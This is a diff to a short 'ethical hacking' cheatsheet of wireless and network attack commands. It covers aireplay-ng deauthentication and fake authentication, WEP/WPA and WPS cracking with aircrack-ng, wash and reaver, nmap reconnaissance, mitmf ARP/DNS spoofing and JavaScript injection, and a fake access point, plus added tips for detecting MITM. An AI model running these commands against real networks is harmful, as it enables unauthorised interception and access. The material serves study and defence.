@@ -7,7 +7,7 @@ This is a cheatsheet for commands and tools commonly used for ethical hacking.
 3) Deauth          : a)  aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
 4) Fake Auth       : a)  aireplay-ng -1 0 -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 ath0
 
-5) Cracking WEP/WPA: Use of aircrack-ng depends on encryption
+5) Cracking WEP/WPA: Use of aircrack-ng depends on encryption. WPS in WPA -- a) wash -i wlan0 b) reaver -i wlan0 -b <> -vvv 
 
 6) Reconnaissance  : a) netdiscover -r 10.0.2.1/24 b) nmap / zenmap(GUI)
 
@@ -21,3 +21,7 @@ MITM:
 10) DNS Spoof      : a) Add dns entry to /etc/mitmf/mitmf.conf b) mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.9 -i ath0 --dns 
  
 11) Inject code    : a) Use mitmf with --inject --js-payload 'alert("test");'
+
+12) Fake AP MITM   : mana-toolkit
+
+13) Detect MITM Att: a) Use xarp (both windows and linux based options) b) Use wireshark. ->Analyse->Expert info. c) Configure gateway ip-mac to be static instead of dynamic.
